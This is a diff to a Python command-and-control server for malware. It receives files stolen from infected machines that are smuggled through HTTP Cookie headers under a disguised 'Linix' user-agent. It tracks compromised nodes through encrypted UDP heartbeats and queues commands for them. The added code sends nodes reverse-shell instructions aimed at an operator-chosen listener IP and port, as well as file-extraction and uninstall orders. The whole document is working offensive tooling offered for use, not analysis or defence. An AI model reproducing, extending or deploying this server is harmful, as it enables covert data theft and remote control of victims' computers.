@@ -3,10 +3,11 @@ import socket
 import string
 import base64
 import threading
+import time
 from Crypto.Cipher import AES
 from Crypto.Hash import SHA256
 from Crypto.Random import get_random_bytes
-from Crypto.Util.Padding import unpad
+from Crypto.Util.Padding import unpad, pad
 from flask import Flask, request, Response, session, render_template, redirect
 from access import *
 
@@ -23,19 +24,26 @@ print(key.hex())
 
 # Holds file fragments during exfiltration
 # When the file is completely sent, it is removed from here and reconstructed
-exfil_files = []
+exfil_files = {}
 
 # Holds messages for malware
-message_buffer = []
+message_buffer = {}
 # Holds node information
-nodes = []
+nodes = {}
+
+# Locks
+exfil_files_lock = threading.Lock()
+message_buffer_lock = threading.Lock()
+nodes_lock = threading.Lock()
 
 
 # Takes data from "exfil_files" and constructs the original file
 def process_exfil_file(sender):
+    exfil_files_lock.acquire()
     nonce = exfil_files[sender]['nonce']
     ciphertext = exfil_files[sender]['data']
     exfil_files.pop(sender)  # remove once we get the data (if it fails we don't want it sitting in our list)
+    exfil_files_lock.release()
 
     cipher = AES.new(key, AES.MODE_CBC, nonce)
     plaintext_encoded = unpad(cipher.decrypt(ciphertext), AES.block_size)  # decrypt contents
@@ -63,10 +71,14 @@ def handle_exfil_chunk(data, sender, cont):
     if "_" in data:  # First data packet includes the nonce
         nonce_encoded = data[0:len(data)-1]
         nonce = base64.b64decode(nonce_encoded)
+        exfil_files_lock.acquire()
         exfil_files[sender] = {'nonce': nonce, 'data': ''}  # relying on the fact that the sender's IP wont change before the file is received
+        exfil_files_lock.release()
     else:  # Second and beyond packets are file contents
         content = base64.b64decode(data)
+        exfil_files_lock.acquire()
         exfil_files[sender]['data'] += content
+        exfil_files_lock.release()
 
     if cont == 'close':
         return Response()
@@ -90,7 +102,40 @@ def command():
             if SHA256.new(candidate_authcode.encode()).hexdigest() == authcode:
                 session['logged_in'] = True
             return redirect('/cmd')
-    return render_template('command.html')
+    return render_template('command.html', nodes=nodes.values(), current_time=time.time(), round=round)
+
+
+@app.route('/ndc', methods=['GET', 'POST'])
+@is_logged_in
+def node_command():
+    if request.method == 'POST':
+        if {'listenerIP', 'listenerPort', 'nodeID'}.issubset(request.form.keys()):
+            listener_ip = request.form['listenerIP']
+            listener_port = request.form['listenerPort']
+            node_id = request.form['nodeID']
+            message = "shell "+listener_ip+" "+listener_port
+            message_buffer_lock.acquire()
+            message_buffer[node_id].append(message)
+            message_buffer_lock.release()
+        return redirect('/cmd')
+    else:
+        if 'node' not in request.args or 'action' not in request.args:
+            return redirect('/cmd')
+        if request.args['action'] not in ['1', '2', '3'] or request.args['node'] not in nodes.keys():
+            return redirect('/cmd')
+        if request.args['node'] not in message_buffer:
+            message_buffer[request.args['node']] = []
+        if request.args['action'] == '1':  # Extract File
+            pass
+        elif request.args['action'] == '2':  # Shell
+            pass
+        else:  # Uninstall
+            message_buffer_lock.acquire()
+            message_buffer[request.args['node']].append("uninstall")
+            message_buffer_lock.release()
+            return redirect('/cmd')
+
+        return render_template('node_command.html', id=request.args['node'], action=request.args['action'])
 
 
 # Logout function
@@ -102,7 +147,7 @@ def logout():
 
 
 # This is the exfiltration mechanic
-# The malware makes the user-agent include "Loonix" instead of "Linux", and
+# The malware makes the user-agent include "Linix" instead of "Linux", and
 # sends data in the Cookie field of the header
 # If there is more data to send, the malware adds the "Connection: keep-alive" field
 # and the server will send back a 307 status
@@ -111,7 +156,7 @@ def logout():
 @app.errorhandler(404)
 def handle_404(e):
     user_agent = request.headers.get('User-Agent')
-    if 'Loonix' in user_agent:
+    if 'Linix' in user_agent:
         cont = request.headers.get('Connection')
         sender = request.environ['REMOTE_ADDR']
         resp = handle_exfil_chunk(request.headers.get('Cookie'), sender, cont)
@@ -128,20 +173,51 @@ def web_backend():
 
 
 # Handles UDP messages from server
-def handle_message(message, addr):
+def handle_message(message, addr, server_socket):
     print(addr)
-    print(message)
+    node_id = -1
     # Process Message
-    nonce_encoded, ciphertext_encoded = message.decode().strip().split("_")
-    nonce = base64.b64decode(nonce_encoded)
-    ciphertext = base64.b64decode(ciphertext_encoded)
-    cipher = AES.new(key, AES.MODE_CBC, nonce)
-    plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
-    node_id, message_encoded = plaintext.decode().split("_")
-    message = base64.b64decode(message_encoded).decode().strip()
+    try:
+        nonce_encoded, ciphertext_encoded = message.decode().strip().split("_")
+        nonce = base64.b64decode(nonce_encoded)
+        ciphertext = base64.b64decode(ciphertext_encoded)
+        cipher = AES.new(key, AES.MODE_CBC, nonce)
+        plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
+        node_id, message_encoded = plaintext.decode().split("_")
+        message = base64.b64decode(message_encoded).decode().strip()
+    except ValueError:
+        print("Bad encryption key or bad message format")
 
+    print(node_id)
     if message == 'heartbeat':
+        nodes_lock.acquire()
+        nodes[node_id] = {'id': node_id, 'ip': addr[0], 'port': addr[1], 'time': time.time()}
+        nodes_lock.release()
+        message_buffer_lock.acquire()
+        if node_id not in message_buffer:
+            message_buffer[node_id] = []
+        if len(message_buffer[node_id]) == 0:
+            cmd = "none"
+        else:
+            cmd = message_buffer[node_id].pop(0)
+        message_buffer_lock.release()
+        plaintext = cmd.encode()
+        nonce = get_random_bytes(16)
+        cipher = AES.new(key, AES.MODE_CBC, nonce)
+        ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
+        nonce_encoded = base64.b64encode(nonce).decode()
+        ciphertext_encoded = base64.b64encode(ciphertext).decode()
+        response_message = nonce_encoded + "_" + ciphertext_encoded
+        server_socket.sendto(response_message.encode(), addr)
+
         print('Heartbeat noticed')
+    elif message == 'uninstall ack':
+        nodes_lock.acquire()
+        nodes.pop(node_id)
+        nodes_lock.release()
+        message_buffer_lock.acquire()
+        message_buffer.pop(node_id)
+        message_buffer_lock.release()
     else:
         print(message)
     return
@@ -163,7 +239,7 @@ def command_server():
         recv = server_socket.recvfrom(buffer_size)
         message = recv[0]
         addr = recv[1]
-        handle_message(message, addr)
+        handle_message(message, addr, server_socket)
 
 
 x = threading.Thread(target=command_server)
